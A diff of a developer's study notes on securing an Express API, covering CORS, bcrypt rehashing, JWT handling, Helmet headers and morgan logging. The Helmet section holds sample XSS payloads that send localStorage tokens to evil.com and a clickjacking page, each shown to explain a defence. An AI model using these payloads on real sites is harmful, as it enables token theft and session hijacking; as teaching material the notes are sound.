@@ -148,10 +148,11 @@ const allowedOrigins =
 
 ```js
 origin(origin, callback) {
+    // Postman, curl, server-to-server — no Origin header
     if (!origin || allowedOrigins.includes(origin)) {
         callback(null, true);   // ✅ allow
     } else {
-        callback(new Error('Not allowed by CORS'));  // ❌ block
+        callback(new AppError('Not allowed by CORS', 403));  // ❌ block
     }
 }
 ```
@@ -159,8 +160,89 @@ origin(origin, callback) {
 | Request from | Result |
 |--------------|--------|
 | Next.js `:3000` | ✅ Allowed |
-| Random site `evil.com` | ❌ Blocked |
+| Random site `evil.com` | ❌ Blocked → **403** |
 | Postman (no Origin header) | ✅ Allowed |
+
+#### Why it's a function, and what `callback` expects
+
+A function instead of a static array means it runs **per request**, so it can consult a list, a database, or a pattern. The signature is a Node-style `callback(error, allow)`:
+
+| Call | Effect |
+|------|--------|
+| `callback(null, true)` | Allowed — `cors` echoes that exact origin back in `Access-Control-Allow-Origin` |
+| `callback(someError)` | Rejected — the error goes to the global error handler |
+
+#### Why `!origin` is allowed — and why that's not a hole
+
+Non-browser clients (Postman, curl, another server) send **no `Origin` header at all**. Allowing them is why Postman keeps working while `evil.com` is blocked.
+
+That's not a loophole, because **CORS is enforced by the browser, not by your server**. A curl request was never restricted in the first place — there is nothing to bypass.
+
+> ⚠️ CORS protects *your users' browsers* from other websites making authenticated requests on their behalf. It is **not access control** — that's `protect`'s job ([§8d](#8d-jwt-lifecycle--sign-verify-requser)).
+
+---
+
+### The rejection used to be a 500 — fixed
+
+Originally the block path threw a plain `Error`:
+
+```js
+callback(new Error('Not allowed by CORS'));
+```
+
+A plain `Error` is **unrecognised** by the global handler ([§14](#14-centralized-error-handling--the-apperror-class)), so a blocked origin produced `500 Something went wrong` and was logged as `Unhandled error ===>` — as if the server had a bug. A blocked origin is an expected, operational outcome, not a crash.
+
+**Now** (verified against the running server):
+
+```
+status: 403
+body: {"success":false,"status":403,"message":"Not allowed by CORS"}
+```
+
+**Lesson worth generalising:** any library that takes an error *you* construct is a place to pass an `AppError`, or it lands in the "unknown bug" bucket and pollutes the logs.
+
+---
+
+### `credentials: true`
+
+Sends `Access-Control-Allow-Credentials: true`, which lets a cross-origin browser request include **cookies**, and lets the frontend read the response when it uses `credentials: 'include'`.
+
+| | Detail |
+|---|--------|
+| **Needed today?** | **No** — auth here is a Bearer token in a header, not a cookie |
+| **Harmless?** | Yes, and it future-proofs cookie-based auth |
+| **Rule it enforces** | With credentials enabled, the wildcard `*` origin becomes **illegal** — you must echo a specific origin, which the function form already does |
+
+---
+
+### `methods` and `allowedHeaders` — these are about **preflight**
+
+This is the part that feels arbitrary until you see the mechanism.
+
+For anything beyond a "simple" request — and `Content-Type: application/json`, an `Authorization` header, or a `PATCH`/`DELETE` **all** qualify — the browser sends an `OPTIONS` request **first** and waits for permission before sending the real one.
+
+```
+1. OPTIONS /api/v1/tasks     → "may I PATCH, with Content-Type and Authorization?"
+2. server responds:  Access-Control-Allow-Methods: GET, POST, PATCH, DELETE
+                     Access-Control-Allow-Headers: Content-Type, Authorization
+3. PATCH /api/v1/tasks/123   → the actual request
+```
+
+So these two options are the **answers** to that question:
+
+| Option | Answers |
+|--------|---------|
+| `methods: ['GET','POST','PATCH','DELETE']` | Which verbs are permitted cross-origin |
+| `allowedHeaders: ['Content-Type','Authorization']` | Which headers the browser may send |
+
+⚠️ If `Authorization` weren't listed, the browser would **refuse to send your token** — and that failure appears in the browser console, never in your server logs. That's what makes CORS bugs so confusing to debug.
+
+**Two practical notes:**
+
+- `cors` answers the `OPTIONS` request for you — you never write a handler for it
+- This is why one browser `fetch` counts as **two** requests against the rate limiter — the puzzle from [§11](#11-rate-limiting--what-it-is-strategies-what-we-use) where Postman worked but the browser hit a 429
+
+---
 
 ### Rule
 
@@ -908,9 +990,60 @@ const isMatch = await bcrypt.compare(password, user.password);
 if (!this.isModified('password')) return;
 ```
 
-Skip hashing if password **wasn't changed** — e.g. user updates email only.
+**In one line:** only hash when the password actually changed.
 
-Without this: already-hashed password would get **hashed again** → login breaks.
+`this` is the document being saved. `isModified('password')` asks Mongoose's dirty-tracking whether that field was assigned since the document was loaded.
+
+#### Traced with real values
+
+Say the password is `cat123` and hashing it gives `$2a$10$AAA`.
+
+**Step 1 — register.** New document, so every field counts as modified → the hook hashes.
+
+| In the database | |
+|---|---|
+| email | `ash@x.com` |
+| password | `$2a$10$AAA` |
+
+Login works: `bcrypt.compare('cat123', '$2a$10$AAA')` → `true`
+
+**Step 2 — later, the user changes only their email.**
+
+```js
+const user = await User.findOne({ email: 'ash@x.com' });
+// user.password is now "$2a$10$AAA" — the HASH, loaded from the DB.
+// The plain password is long gone.
+
+user.email = 'ashish@x.com';
+await user.save();
+```
+
+| | Without the guard | With the guard |
+|---|-------------------|----------------|
+| Hook | Hashes whatever it finds — the hash | `isModified` is `false` → returns early |
+| Stored password | `$2a$10$BBB` ← **a hash of a hash** | `$2a$10$AAA` ← untouched |
+| `bcrypt.compare('cat123', stored)` | `false` — **locked out forever** | `true` |
+
+No error, no warning. The email change silently destroys the login.
+
+**Step 3 — an actual password change.** `user.password = 'dog456'` → `isModified` is `true` → hashed normally.
+
+#### `return` skips the hashing, not the save
+
+In a `pre` hook, resolving normally means "carry on and write the document". The only way to abort a save is to **throw**. That's why in step 2 the new email *is* still stored.
+
+#### Does this project even need it?
+
+**Today, no** — and that's worth being honest about. The only User write in the codebase is `User.create` in `register`, so `isModified` is always `true` and the early return never fires.
+
+⚠️ But note **why** it's safe, because it's easy to get this wrong: it is *not* the duplicate-email check in `register` that protects you. Re-hashing needs a **second `save()` on an already-saved document**, and no such code path exists yet. Add any of these and it appears immediately:
+
+- a change-password endpoint
+- a profile / email update
+- `lastLoginAt` stamped on login
+- an `emailVerified` flag
+
+One comparison, versus a silent permanent lockout. Keep the line.
 
 ---
 
@@ -921,6 +1054,176 @@ Without this: already-hashed password would get **hashed again** → login break
 **Login:** no pre hook — **`bcrypt.compare`** re-hashes input and checks it matches stored hash.
 
 **Never** store or transmit plain passwords in DB after register. **Never** decrypt — compare only.
+
+---
+
+## 8d. JWT lifecycle — `sign`, `verify`, `req.user`
+
+**Files:** `controllers/auth.js` (sign), `middleware/auth.js` (verify + attach)
+
+Three lines carry the whole auth system. Following them in order explains what a token can and cannot do.
+
+---
+
+### Step 1 — `jwt.sign` creates the token (login only)
+
+```js
+const token = jwt.sign(
+    { userId: user._id },
+    process.env.JWT_SECRET,
+    { expiresIn: process.env.JWT_EXPIRES_IN || '7d' }
+);
+```
+
+| Argument | Job | Gotcha |
+|----------|-----|--------|
+| **`{ userId: user._id }`** — payload | The data baked into the token | Base64-**encoded**, *not* encrypted. Paste a token into [jwt.io](https://jwt.io) and the user id is readable. **Never put secrets in it** |
+| **`JWT_SECRET`** — signing key | Produces the signature that makes the token tamper-proof | Anyone holding this can mint a token for **any** user. Crown jewel of the app |
+| **`{ expiresIn }`** — options | Adds the `exp` claim | 7 days is long — see the revocation problem below |
+
+The only place a token is created in this project.
+
+---
+
+### Step 2 — `jwt.verify` checks it (every protected request)
+
+```js
+decoded = jwt.verify(token, process.env.JWT_SECRET);
+```
+
+**What it checks — two things, both local, no database:**
+
+| Check | Fails when |
+|-------|-----------|
+| **Signature** | Payload was altered, or it was signed with a different secret |
+| **Clock** (`exp`) | The expiry time has passed |
+
+On success it returns the decoded payload — note `iat` and `exp` were added by `sign`:
+
+```js
+{ userId: '6a7b242f3b7877edcc1769e4', iat: 1786455087, exp: 1787059887 }
+```
+
+**What it does NOT check:** whether the user is genuine. It's cryptography plus a clock — it has no idea if that `userId` still exists. A token stays valid after the user is deleted, banned, or demoted.
+
+**It throws rather than returning `false`:**
+
+| Error | Meaning |
+|-------|---------|
+| `JsonWebTokenError` | Bad signature or malformed token |
+| `TokenExpiredError` | Past `exp` |
+
+Both mean "not authorized", never "the server broke" — which is why this call sits in its **own** `try` and becomes a 401 ([§14](#14-centralized-error-handling--the-apperror-class)).
+
+---
+
+### Step 3 — the database lookup answers the other question
+
+```js
+const user = await User.findById(decoded.userId).select('-password');
+if (!user) {
+    throw new AppError('User no longer exists', 401);
+}
+```
+
+| Step | Question | Cost |
+|------|----------|------|
+| `jwt.verify` | Is this token authentic and unexpired? | Free — pure computation |
+| `User.findById` | Does this person still exist? | One DB query per request |
+
+That query is the price of freshness: a deleted or demoted user is caught immediately. Apps that put `role` **in** the token skip the query but then carry stale permissions until expiry.
+
+Its own separate `try` matters — a Mongo outage here must be a 500 about a real outage, not a misleading "invalid token".
+
+---
+
+### Step 4 — `req.user = user` hands it onward
+
+```js
+req.user = user;
+next();
+```
+
+`req` is a plain object living for one request, so you can hang properties on it. `next()` passes that same object down the chain, making `req.user` readable by every route and controller after this point.
+
+**This is where "who is asking" becomes available**, which is what makes ownership work:
+
+```js
+const filter = { userId: req.user._id };                     // getTasks
+const task = new Task({ ...value, userId: req.user._id });   // createTask
+```
+
+| Property | Why it matters |
+|----------|----------------|
+| **Trust boundary** | `req.user` comes from a signed token + a DB read, so it can't be forged. Taking the id from `req.body` would let anyone impersonate anyone — which is why `validateTaskBody` strips `userId` as a server-owned field |
+| **Per-request** | Set fresh each time, gone when the request ends. Concurrent users never see each other's |
+| **No password** | `.select('-password')` means even `res.json(req.user)` leaks nothing |
+
+---
+
+### Q: If I have a JWT, can I fake someone's identity?
+
+**It depends which "have" — and this is the most important thing to understand about tokens.**
+
+| Scenario | Can you impersonate? | Why |
+|----------|---------------------|-----|
+| You **steal someone's** token | ✅ **Yes, completely** | A JWT is a **bearer** credential — whoever bears it *is* that user. `protect` only asks "valid and unexpired?", never "is this the same person we issued it to?" |
+| You **edit** a token you hold | ❌ No | Change the payload and the signature stops matching → `verify` throws → 401 |
+| You have the **secret** | ✅ Yes, for anyone | You can mint valid tokens at will |
+
+**The subtle one:** if `JWT_SECRET` is short or guessable, an attacker who captures **one** valid token can brute-force the secret **offline** — their hardware, no requests to your server, nothing in your logs — then forge freely. Use 32+ random bytes, not a memorable phrase.
+
+---
+
+### Q: What's the real weakness of this design?
+
+**You cannot take a token back.** There's no logout that truly works, because verification deliberately needs no database lookup. A leaked token is valid until `exp` — a **7-day** window here — and nothing in the current code can stop it.
+
+| Fix | How it works |
+|-----|--------------|
+| **Short access token + refresh token** | Access token lives 5–15 min; the refresh token is stored server-side and *can* be revoked. What production systems do |
+| **`tokenVersion` on the user** | Put a version number in the payload; reject tokens whose version doesn't match the stored one. Bumping it = instant logout everywhere + a password-reset kill switch. **Cheap here**, because `protect` already loads the user |
+
+**Where tokens actually leak** — rarely from the server: `localStorage` read by an XSS payload, tokens pasted into logs or URLs, browser history, a compromised third-party frontend script. Helmet's CSP ([§10b](#10b-safe-http-headers--what-helmet-actually-does)) and morgan not logging the `Authorization` header ([§12](#12-request-logging-morgan--health-check)) both help. Over plain HTTP the token is readable on the wire — HTTPS is non-negotiable in production.
+
+---
+
+### Q: Where does the id in the payload come from?
+
+`login` looks the user up by **email** — the only unique thing a user actually knows; nobody types their own ObjectId — and `findOne` returns the whole document, so `_id` comes along for free.
+
+⚠️ **Mongoose generates the `ObjectId`, not MongoDB.** It's 12 bytes built from a timestamp, a machine/process id and a counter, created in your Node process, so `user._id` exists *before* the insert reaches the database.
+
+| Step | What happens | Where it lives |
+|------|--------------|----------------|
+| Register | Mongoose generates the `ObjectId` | `users._id` |
+| Login | `findOne({ email })` → `user._id` | in memory |
+| Login | `jwt.sign({ userId: user._id })` | JWT payload |
+| Any `/tasks` call | `verify` → `findById(decoded.userId)` | `req.user._id` |
+| Create task | `userId: req.user._id` | `tasks.userId` |
+| Read / update / delete | `{ _id: req.params.id, userId: req.user._id }` | query filter |
+
+**Trap for later:** `user._id` is an `ObjectId` **object**, but after a round trip through `sign` / `verify` it's a plain **string**:
+
+```js
+req.user._id === decoded.userId    // false — object vs string
+```
+
+Use `.equals()` or `.toString()` when comparing ids directly. Your code sidesteps this today because ids are always handed to Mongoose, which casts them — but it bites on the first manual ownership check.
+
+---
+
+### One small hardening
+
+`jwt.verify(token, process.env.JWT_SECRET)` doesn't pin the algorithm. Modern `jsonwebtoken` guards against the classic `alg: none` and algorithm-confusion tricks, so this isn't exposed today — but passing `{ algorithms: ['HS256'] }` states the intent and removes the class of attack regardless of library version.
+
+---
+
+### One-line summary
+
+**`sign` bakes a user id into a signed, readable, non-revocable token; `verify` proves only that the token is authentic and unexpired; the `findById` after it proves the user still exists; and `req.user` is the trust boundary every ownership check depends on. Stealing a token is impersonation — editing one isn't.**
+
+See also: [`authflow.md`](authflow.md) for the full JWT deep dive, [§8b2](#8b2-task-ownership--where-userid-comes-from) for the id journey, [§16.3](#163-how-oauth-and-openid-connect-actually-work) for how OAuth differs.
 
 ---
 
@@ -1244,6 +1547,41 @@ X-Content-Type-Options: nosniff
 
 Now something served as `application/json` can never be reinterpreted as a script.
 
+##### Example — the attack it prevents
+
+Say you add task attachments and serve them from `public/`. An attacker uploads a file named `notes.txt` whose contents are:
+
+```html
+<script>fetch('https://evil.com/steal?t=' + localStorage.token)</script>
+```
+
+Your server does everything right — it's a `.txt`, so it goes out as text:
+
+```http
+GET /uploads/notes.txt
+
+HTTP/1.1 200 OK
+Content-Type: text/plain          ← correct!
+```
+
+Then the attacker puts this on their own page:
+
+```html
+<script src="https://yourapp.com/uploads/notes.txt"></script>
+```
+
+**Without `nosniff`:** the browser peeks at the bytes, thinks "that's JavaScript", ignores `text/plain`, and **executes it on your origin** — with access to your `localStorage` token.
+
+**With `nosniff`** the browser refuses and logs:
+
+```
+Refused to execute script from 'https://yourapp.com/uploads/notes.txt'
+because its MIME type ('text/plain') is not executable, and strict MIME
+type checking is enabled.
+```
+
+> Note the shape of this bug: your `Content-Type` was **correct** the whole time. The vulnerability was the browser second-guessing you.
+
 #### 2. `X-Frame-Options: DENY` — stop clickjacking
 
 The attack:
@@ -1267,6 +1605,41 @@ X-Frame-Options: DENY          ← no framing at all
 X-Frame-Options: SAMEORIGIN    ← only my own domain may frame me
 ```
 
+##### Example — the attacker's page
+
+The whole attack is this much HTML:
+
+```html
+<!-- evil-site.com -->
+<style>
+  iframe { position: absolute; top: 0; left: 0;
+           width: 100%; height: 100%;
+           opacity: 0;              /* invisible, but still clickable */
+           z-index: 10; }           /* sits ON TOP of the decoy */
+  button { position: absolute; top: 300px; left: 200px; }
+</style>
+
+<button>Click to claim your prize</button>
+<iframe src="https://yourapp.com/tasks"></iframe>
+```
+
+The victim sees the button, clicks it, and the click actually lands on whatever sits at that coordinate **inside your app** — with their real session.
+
+**With the header set,** the iframe never renders and the browser logs:
+
+```
+Refused to display 'https://yourapp.com/tasks' in a frame because it set
+'X-Frame-Options' to 'sameorigin'.
+```
+
+**Modern equivalent** — CSP supersedes this header, and both are usually sent:
+
+```
+Content-Security-Policy: frame-ancestors 'none'
+```
+
+Helmet already sends `frame-ancestors 'self'` as part of its default CSP, which is why your response carries both.
+
 #### 3. `Content-Security-Policy` — stop injected scripts from running
 
 If a stored comment contains `<script>fetch('evil.com?token=' + localStorage.token)</script>` and the frontend renders it, the browser runs it with full access to the page — localStorage, cookies, your API. That's XSS.
@@ -1278,6 +1651,54 @@ Content-Security-Policy: default-src 'self'; script-src 'self'
 ```
 
 An injected inline `<script>` has no source URL, so it isn't "from `'self'`" → the browser refuses to execute it and logs a CSP violation.
+
+##### Example — traced through your own API
+
+Your `Task` model has a `comments` array of strings, so this is a real path, not a hypothetical:
+
+**1. Attacker stores the payload** — it's a valid string, so your validation accepts it (correctly — the API isn't the place to strip HTML):
+
+```json
+POST /api/v1/tasks
+{
+  "title": "Team standup",
+  "description": "daily sync",
+  "comments": ["<img src=x onerror=\"fetch('https://evil.com?t='+localStorage.token)\">"]
+}
+```
+
+**2. The frontend renders it** — one careless line is all it takes:
+
+```jsx
+<div dangerouslySetInnerHTML={{ __html: task.comments[0] }} />
+```
+
+**3a. Without CSP:** the `img` fails to load, `onerror` fires, and the victim's token is sent to `evil.com`. Silent, no visible change to the page.
+
+**3b. With CSP:** the browser blocks it and logs:
+
+```
+Refused to execute inline event handler because it violates the following
+Content Security Policy directive: "script-src 'self'". Either the
+'unsafe-inline' keyword, a hash, or a nonce is required to enable inline
+execution.
+```
+
+> ⚠️ Notice **where** the defence lives: the payload passed through your API untouched. CSP on this API's responses does nothing here — the header that stops this is the one on the **page that renders** the comment. That's why this matters when the Next.js frontend arrives.
+
+##### Example — reading a policy
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:
+```
+
+| Directive | Means |
+|-----------|-------|
+| `default-src 'self'` | Fallback for anything not named below: same origin only |
+| `script-src 'self'` | Scripts only from my own domain — **no inline, no CDN** |
+| `img-src 'self' data:` | Images from my domain, plus `data:` URIs |
+
+Adding a CDN is a matter of naming it: `script-src 'self' https://cdn.jsdelivr.net`.
 
 **Why people disable it:** it blocks inline scripts/styles by default, which many libraries, analytics snippets and CSS-in-JS tools rely on. Fixing that properly means per-source allowances or nonces.
 
@@ -1292,6 +1713,29 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains
 ```
 
 Seen once, the browser remembers for a year: **never** contact this domain over HTTP again — the redirect now happens inside the browser, before any packet leaves.
+
+##### Example — the two wire sequences
+
+**Without HSTS** (attacker on the same café WiFi):
+
+```
+1. user types      yourapp.com
+2. browser  ──▶    http://yourapp.com          ← plaintext, interceptable
+3. attacker ◀──    answers instead of you, serving a lookalike over http
+4. user logs in on the fake page               ← password + token stolen
+```
+
+Your real server's HTTPS redirect never got a chance to run — step 3 replaced it.
+
+**With HSTS**, after one prior successful HTTPS visit:
+
+```
+1. user types      yourapp.com
+2. browser         rewrites to https:// INTERNALLY  ← no packet sent yet
+3. browser  ──▶    https://yourapp.com             ← attacker sees only encrypted traffic
+```
+
+The fix works because step 2 happens **inside** the browser, so there is no plaintext request to hijack.
 
 **Two catches:**
 - Only helps *after* the first successful HTTPS visit (browser preload lists exist for that gap).
@@ -1353,9 +1797,50 @@ app.disable('x-powered-by');
 
 ---
 
+### See it on your own server
+
+**List every security header on a response:**
+
+```powershell
+(Invoke-WebRequest http://localhost:3005/health -UseBasicParsing).Headers
+```
+
+```bash
+# bash / git-bash equivalent
+curl -sI http://localhost:3005/health
+```
+
+**Prove the `/api-docs` relaxation is scoped** — the reason `app.js` has two Helmet configs:
+
+```powershell
+$strict = (Invoke-WebRequest http://localhost:3005/health -UseBasicParsing)
+$loose  = (Invoke-WebRequest http://localhost:3005/api-docs/ -UseBasicParsing)
+
+$strict.Headers['Content-Security-Policy']   # script-src 'self'
+$loose.Headers['Content-Security-Policy']    # script-src 'self' 'unsafe-inline'
+```
+
+| Path | `script-src` | Why |
+|------|--------------|-----|
+| `/health`, `/api/v1/*` | `'self'` | Strict — the global `helmet()` |
+| `/api-docs` | `'self' 'unsafe-inline'` | Swagger UI injects an inline init script, which the strict policy blocks |
+
+**Confirm `X-Powered-By` is gone:**
+
+```powershell
+(Invoke-WebRequest http://localhost:3005/health -UseBasicParsing).Headers['X-Powered-By']
+# empty — Helmet removed it
+```
+
+> 💡 **Worth doing once for learning:** comment out `app.use(helmet())`, restart, and re-run the first command. Twelve headers become zero, and `X-Powered-By: Express` reappears. That's the concrete answer to "what does this library actually do for me."
+
+---
+
 ### One-line summary
 
 **`nosniff` stops type guessing, `X-Frame-Options` stops clickjacking, CSP stops injected scripts from executing, HSTS stops downgrade attacks — and Helmet sets that whole family with sensible defaults in one line.**
+
+**The examples above share one shape:** in every case your server behaved correctly and the *browser* was the thing being tricked — which is why these headers are instructions to the browser, and why Postman shows them but ignores them.
 
 ---
 
@@ -1592,17 +2077,52 @@ That response-time column is the underrated one: it's how you'd notice a `$regex
 
 Early in the chain, right after `helmet()` — so **404s and rate-limited 429s get logged too**.
 
-```js
-const morgan = require('morgan');
+This project mounts morgan **twice**. Destinations and formats are different jobs.
 
-app.use(helmet());
-app.use(morgan('dev'));   // local
+```js
+app.use(morgan(isProduction ? 'combined' : 'dev', { skip: skipHealthCheck }));
+// ↑ line 22 — always on, writes to process.stdout
+
+if (!isProduction) {
+    app.use(morgan('combined', {
+        stream: fs.createWriteStream(path.join(logsDir, 'access.log'), { flags: 'a' }),
+        skip: skipHealthCheck
+    }));
+}
+// ↑ line 30 — local only, writes to logs/access.log
 ```
+
+| | stdout (line 22) | `logs/access.log` (line 30) |
+|---|---|---|
+| development | yes, **`dev`** format | yes, **`combined`** format |
+| production | yes, **`combined`** format | no |
+
+Locally you get two lines per request on purpose: the terminal line is for reading while you work, the file is history after the terminal is cleared.
+
+### `combined` vs `dev` — templates, not destinations
+
+They only change **what the line looks like**. They do not pick a file or a pipe. Morgan's source (`node_modules/morgan/index.js`):
+
+**`dev`** — short, coloured, for a human in a terminal. Includes response time. No IP, no user-agent.
+
+```
+GET /api/v1/tasks 200 12.341 ms - 482
+```
+
+Status colour: green (2xx), cyan (3xx), yellow (4xx), red (5xx).
+
+**`combined`** — Apache Combined Log Format. Machine-parseable. What grep / CloudWatch / systemd expect. No colour, no response time.
+
+```
+::1 - - [13/Aug/2026:10:55:01 +0530] "GET /api/v1/tasks HTTP/1.1" 200 482 "http://localhost:3000" "Mozilla/5.0 ..."
+```
+
+That is why line 22 uses `combined` in production (stdout will be collected) and `dev` locally (you are reading the screen). The file logger always uses `combined` so even locally you have a greppable history.
 
 | Format | Output | Use |
 |--------|--------|-----|
-| **`dev`** | Short, coloured by status | Local development |
-| **`combined`** | Apache combined (IP, user-agent, referrer) | Production — what log tooling expects |
+| **`dev`** | Short, coloured by status, has duration | Local terminal |
+| **`combined`** | Apache combined (IP, user-agent, referrer) | Production / files / log tooling |
 | **`tiny`** | Minimal | Noise reduction |
 
 ### What morgan does **not** do
@@ -1614,6 +2134,116 @@ app.use(morgan('dev'));   // local
 | No request id, so multi-line traces can't be correlated | `X-Request-Id` + custom token |
 
 ⚠️ **Never log the `Authorization` header or request bodies.** Morgan's built-in formats don't — but a custom token makes it easy to write tokens and passwords to disk forever.
+
+---
+
+### Q: What is stdout? And stderr?
+
+**stdout** is the default output channel every process gets from the operating system — "standard output." When your code writes to it, the text leaves the process through a **pipe**. Whoever **started** the process decides where that pipe leads. The process itself does not know.
+
+Every process gets three of these streams at launch:
+
+| Stream | Number | Purpose | In Node |
+|--------|--------|---------|---------|
+| **stdin** | 0 | input coming in | `process.stdin` |
+| **stdout** | 1 | normal output | `process.stdout` — used by `console.log` and by morgan |
+| **stderr** | 2 | errors and diagnostics | `process.stderr` — used by `console.error` and Node crash dumps |
+
+Morgan's default (confirmed in the package):
+
+```js
+var stream = opts.stream || process.stdout
+```
+
+So line 22 never names a file. Same unmodified code, different launcher:
+
+```bash
+node app.js                      # → your terminal
+node app.js > access.log         # → a file
+node app.js | grep " 500 "       # → into another program
+docker run my-api                # → captured by Docker, read via `docker logs`
+```
+
+That is the fact worth keeping: **morgan writes to stdout; you decide where stdout goes.** CloudWatch, Azure Monitor, systemd, PM2, or a redirect on your own VPS are all just different answers to "who launched me?"
+
+**stderr** is the sibling pipe, not something morgan switches to on a 500. Status 200 and status 500 both go to stdout. The split exists so they can be routed separately:
+
+```bash
+node app.js > access.log 2> error.log
+```
+
+Most collectors treat anything arriving on stderr as an error without you tagging it. A leftover `console.log` in a controller quietly becomes part of the production access stream — same pipe as morgan.
+
+### Q: Does morgan use stderr when a request fails?
+
+**No.** Morgan does not look at the status code to pick a pipe. A `GET /tasks` that returns 500 still goes through morgan to **stdout**. The line just contains `500`.
+
+If you *wanted* 4xx/5xx on stderr, you would mount a second morgan with `stream: process.stderr` and a `skip` that ignores successes. This project does not do that.
+
+What *does* use stderr in this app is **your** code:
+
+```js
+if (!isKnown) {
+    console.error('Unhandled error ===>', error);  // stderr
+}
+res.status(500).json({ message: 'Something went wrong' });
+// then morgan logs the request to stdout, with 500 in the line
+```
+
+So a handled bug on a request can hit **both** pipes: stderr gets the stack (for you), stdout gets the access line (for traffic history). Morgan still did not "choose stderr because it was an error."
+
+### Q: So a `throw` outside a route is never printed by morgan?
+
+**Yes. Never.** Morgan is HTTP middleware. It only runs when a request comes in, and it only writes **after that request's response finishes**.
+
+```js
+// outside any route — boot, timer, forgotten promise
+setTimeout(() => {
+    throw new Error('db down');
+}, 0);
+```
+
+```
+setTimeout throw
+  → no req, no res
+  → Express never sees it
+  → global error handler never runs
+  → morgan never runs
+  → Node dumps the stack on stderr
+```
+
+Same family — not a finished HTTP request, so morgan is not involved:
+
+| Event | Pipe | Morgan? |
+|-------|------|---------|
+| `GET /tasks` returns 500 (handler sent JSON) | stdout (access line) | yes |
+| `console.error` in the global handler | stderr | no |
+| `mongoose.connect` failing at boot | stderr (`console.error` on line 202) | no |
+| `setTimeout` / `setInterval` throw | stderr (Node) | no |
+| forgotten `Promise.reject` (`unhandledRejection`) | stderr (Node) | no |
+| throw in `app.listen` callback | stderr (Node) | no |
+
+Morgan's log line is **the request, with a status code**. It is not the stack trace.
+
+### Q: What if I am not using cloud — own VPS?
+
+The rule does not change. Line 22 still writes to stdout. "CloudWatch" in the `app.js` comment is just one collector. On a machine you own, **you** attach the collector.
+
+| How you run Node | Where stdout goes |
+|------------------|-------------------|
+| `node app.js` in SSH | your terminal — gone when you disconnect |
+| `node app.js > access.log 2> error.log` | two files you own |
+| **systemd** (`StandardOutput=journal`) | `journalctl -u todo-api` |
+| **PM2** | `pm2 logs` / files under `~/.pm2/logs` |
+| Docker on that same VPS | `docker logs` |
+
+On your own disk, writing `logs/access.log` yourself is also fine — the disk is not ephemeral like a container. That is the old Apache model. You then own:
+
+1. **Rotation** — the file grows forever unless `logrotate` (or a daily rename) exists.
+2. **Clustering** — two Node processes appending the same file will interleave lines.
+3. **Disk full / permissions** — a failed `createWriteStream` can take logging down with the app.
+
+A clean own-server setup: keep line 22, drop the file morgan, let systemd or PM2 write and rotate. You still grep `500` the same way; you grep the journal instead of `logs/access.log`.
 
 ---
 
@@ -1714,6 +2344,43 @@ GET /health → 200 {"status":"ok","db":"connected","uptime":25}
 
 ---
 
+### Q: What is CloudWatch or Datadog? (where morgan lines actually go)
+
+Yes — they are **places logs live in production**, not Node packages. Morgan / pino only **format and print** a line; CloudWatch / Datadog **store and search** it.
+
+| | **AWS CloudWatch** | **Datadog** |
+|--|--------------------|-------------|
+| Who | Built into AWS | Third-party SaaS (AWS, GCP, bare metal, …) |
+| Main job | Logs, metrics, alarms for AWS apps | Logs + metrics + APM (traces) + dashboards |
+| Typical use | App runs on AWS → ship stdout there | One ops UI across many services / clouds |
+
+Your app does **not** usually `require('cloudwatch')` and write there. The usual chain:
+
+```
+Request → morgan / pino → stdout → host agent / platform → CloudWatch or Datadog → you search in their UI
+```
+
+| Layer | Job |
+|-------|-----|
+| **morgan / pino** | Format the access line (method, URL, status, time) |
+| **stdout** | Leave the process through the OS pipe ([above](#q-what-is-stdout-and-stderr)) |
+| **CloudWatch / Datadog** | Capture that stream, keep it, let you filter (`status:500`, `/api/v1/tasks`, …) |
+
+Same idea as a phone camera vs Google Photos: the app takes the photo; the cloud stores and searches it.
+
+**Local vs production in this project**
+
+| Environment | Where you look |
+|-------------|----------------|
+| Local (`!isProduction`) | Terminal (line 22) + `logs/access.log` (line 30) |
+| Production | Line 22 → stdout only; no app-owned file — container disks are ephemeral |
+
+That is why the `app.js` comment names CloudWatch / Azure Monitor: **print to stdout; let the platform collect.** Azure Monitor is the same *role* on Azure; Datadog / Better Stack / Papertrail are the SaaS versions of the same idea.
+
+You do **not** need any of these for learning this API. They matter the day the app is hosted and you can no longer read the terminal.
+
+---
+
 ### Q: Where do access logs live in real apps? (not Redis)
 
 **Redis is the wrong tool** — in-memory means RAM prices for write-once data, with no retention policies or full-text search. Its real jobs here are caching, rate-limit counters, sessions. It *can* be a **buffer** in a pipeline (app → Redis stream → shipper → log store), which is the pipe, not the warehouse.
@@ -1723,7 +2390,7 @@ GET /health → 200 {"status":"ok","db":"connected","uptime":25}
 | Single VPS | Files on disk + `logrotate`; plus nginx's own `/var/log/nginx/access.log` |
 | PM2 | `~/.pm2/logs/*.log` + `pm2-logrotate` |
 | Self-hosted, multi-server | Grafana **Loki** (log-specific, cheap), **OpenSearch**/ELK, **ClickHouse** at high volume |
-| Managed cloud | CloudWatch Logs, Azure Monitor (KQL), or SaaS — Datadog, Better Stack, Papertrail |
+| Managed cloud | CloudWatch Logs, Azure Monitor (KQL), or SaaS — Datadog, Better Stack, Papertrail ([what those are](#q-what-is-cloudwatch-or-datadog-where-morgan-lines-actually-go)) |
 
 **The app's only job is to print to stdout** — everything above is infrastructure capturing that stream, no Express changes needed. That's why `combined` matters: every one of those tools parses it out of the box.
 
@@ -1735,9 +2402,9 @@ Elasticsearch / OpenSearch **is** the "database for logs" — a search engine bu
 
 ### One-line summary
 
-**`morgan` gives one log line per request (method, URL, status, duration) — mounted early so 404s count; `GET /health` returns 200 only when `mongoose.connection.readyState === 1`, otherwise 503, unauthenticated and cheap.**
+**`morgan` writes one access line per finished HTTP request — line 22 always to stdout (`dev` locally, `combined` in prod); line 30 copies `combined` to `logs/access.log` only when not production. stdout/stderr are OS pipes; collectors like CloudWatch / Datadog (or systemd / PM2) capture that stream — morgan formats, they store. Morgan never logs throws outside a request. `GET /health` returns 200 only when `mongoose.connection.readyState === 1`, otherwise 503.**
 
-See also: [`readme.md` — API performance & monitoring](readme.md#api-performance--monitoring).
+See also: [`readme.md`](readme.md#api-performance--monitoring) for implemented vs remaining, [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) — logging is the logs pillar of observability, not the whole thing.
 
 ---
 
@@ -2064,6 +2731,32 @@ app.use((req, res, next) => {
 
 The rate limiter's handler does the same with a 429. Result: unknown routes, rate limits, validation failures and 500s all share one shape — a client can write a single error parser.
 
